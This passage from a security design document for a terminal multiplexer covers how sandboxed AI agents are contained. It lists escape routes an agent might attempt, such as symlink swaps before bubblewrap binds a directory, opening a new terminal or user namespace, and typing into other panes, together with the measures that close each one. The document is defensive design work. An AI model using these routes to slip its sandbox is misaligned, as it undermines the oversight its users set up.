off the machine (`a_sandboxed_agent_keeps_the_network`). A host allowlist needs its own ADR.
Do not give a sandboxed agent a home folder whose other credentials it must not see, and on
macOS do not export secrets in the shells of a user who runs sandboxed agents.

Sandboxed agents run inside their pane's session, so they keep their identity. Everything a sandboxed agent starts stays sandboxed: it, and every pane
under it, may start only sandboxed agent profiles (`agent.launch`) in its own working
directory, and `pane.spawn`, which runs the user's plain shell, is refused. The core
records each sandboxed pane's working directory when it launches it, as OSC 7 from the
agent cannot be trusted. Not a directory inside it: on Linux the agent could swap that
for a symlink before bubblewrap binds it, but it cannot rename its own working directory or
what is above it. `pane.send` without approval reaches only the caller's own pane
and those it spawned, which are then sandboxed too. A sandboxed agent cannot open a built-in tool
(`tool.open`), as the tool would run outside its sandbox. A send to any other pane needs the
person's approval in the window, so a grant the person gives a sandboxed agent lets it type
outside its sandbox. `workspace.open`, `session.save`, workspace trust and grant
administration need a caller in a terminal outside every pane, which a sandboxed agent
cannot be. A caller with no terminal is unidentified, and the sandbox cannot open a new
terminal, whose session no pane would hold: on macOS `sandbox-exec` denies every
`/dev/ttys*` by name, so `openpty` fails, and on Linux bubblewrap's private `/dev` has an
empty `/dev/pts`, so `/dev/ptmx` leads nowhere, and the agent may make no user namespace of
its own, where it could mount a new devpts (`--disable-userns`, so bubblewrap 0.8 or later;
an older one refuses the flag and the agent does not start). The agent keeps the terminal it was started
on. `a_sandboxed_agent_cannot_open_a_new_terminal` in `crates/pinfold-core/tests/sandbox.rs`
checks both with the real tools. A restored session runs shells, never agents, and no
agent runs in them.

A sandboxed agent writes only to its working directory and temporary directories. That
directory comes from the launching pane, whose OSC 7 report any program there can print (T4),
so before the containment rule above it must pass an allowlist: a private directory of the
user's strictly inside `$HOME`, never `~/bin`, `~/Applications`, `~/Library` on macOS or a
dot-directory of home, never inside `.git`, never an entry of the user's `PATH` or above one,
and never inside the directory that holds a `PATH` entry in home, such as `~/go`. Outside home,
the user may own a package manager's prefix such as `/opt/homebrew`, whose programs and config
every pane uses. The `PATH` is the one the user's shell sets, read once from that shell,
interactive as in a pane, followed by the core's own, which is launchd's
`/usr/bin:/bin:/usr/sbin:/sbin`. An agent cannot change the shell's, since it cannot write the
shell's startup files. The reactor never waits for that shell: a launch before it answers is
refused. A `PATH` changed later inside a pane, such as by direnv, is not seen.

## Hardening untrusted input

Bytes from programs, files and repos may change what is drawn. They never become
keystrokes, run commands or leave the machine without your action.

| Sequence                                                       | Risk                                              | Default                                                             |
| -------------------------------------------------------------- | ------------------------------------------------- | ------------------------------------------------------------------- |
| Title report (`CSI 21 t`), DECRQSS, queries that echo strings  | Attacker text written into the shell's input      | Not answered; only fixed-format replies such as cursor position     |
| OSC 52 clipboard                                               | Steal the clipboard, or plant a malicious command | Read off. Write allowed with a status-bar flash, max 64 KB          |
| OSC 8 hyperlinks                                               | Link text that hides the real target              | Real URL shown on hover; `http(s)` on Ctrl + click; others ask      |
| OSC 9 / 777 notifications                                      | Spam, or alerts that look like system ones        | Text never shown; OSC 9 says needs you only in an agent profile's pane, alerting 1 per 10 s per pane, in PinFold's words (ADR-0046) |
| OSC 7501 agent states                                          | A fake "needs you" or "done"                      | Read only in an agent profile's pane, labelled from output; API status outranks them (ADR-0046) |
| OSC 133 marks                                                  | Fake "done" or exit codes                         | Shown as "reported by output"; API status outranks them             |
| OSC 7 cwd                                                      | Path traversal into restore and the file manager  | Must be an existing absolute directory; used only as a hint         |
| Very long sequences, titles, hyperlinks                        | Memory exhaustion                                 | Caps: 4 KB per sequence, 256 B per title, 2,000 hyperlinks per pane |

The paste sanitizer, markdown reader, file manager, git invocation, workspace trust,
snapshot and spill-file rules are in the Security design section of
[`architecture.md`](architecture.md#security-design). They stand unchanged.

## Secure defaults

| Setting                                             | Default                                 | Who can change it                 |
| --------------------------------------------------- | --------------------------------------- | --------------------------------- |
| Agent access to other panes                         | Ask each time                           | You, per grant                    |
| Writes to protected panes                           | Blocked                                 | You, one action at a time         |
| Redaction of cross-pane reads                       | On                                      | Config, confirmed in the window   |
| Clipboard read by programs (OSC 52)                 | Off                                     | Config only                       |
| Scrollback in snapshots                             | Off                                     | Config, per session               |
| Network listeners                                   | None                                    | Not available in v1               |
| Webhook content                                     | Status only                             | Not changeable                    |
| Repo layouts                                        | Ask before first run and on any change  | You                               |

## Security work per milestone

| Milestone  | Deliverables                                                                                       |
| ---------- | -------------------------------------------------------------------------------------------------- |
| Phase 0    | `unsafe` lint policy, `cargo-deny` and `cargo-audit` in CI, this document                          |
| M0         | Caller-identity proof on Linux and macOS (done)                                                    |
| M1         | Escape-sequence policy, paste sanitizer, scrollback byte cap, fuzzing of the VT input path         |
| M2         | Core hardening, socket directory checks, peer UID check, window link                               |
| M3         | Scopes, approvals, protected panes, newline splitting, redaction, audit log, sandbox, API fuzzing  |
| M4         | Filename and markdown sanitizing, hardened git invocation, tool size and time caps                 |
| M5         | Workspace trust, encrypted spill files, snapshot redaction, signed and notarized releases          |
| Before 1.0 | External penetration test focused on the agent API and escape-sequence handling                    |
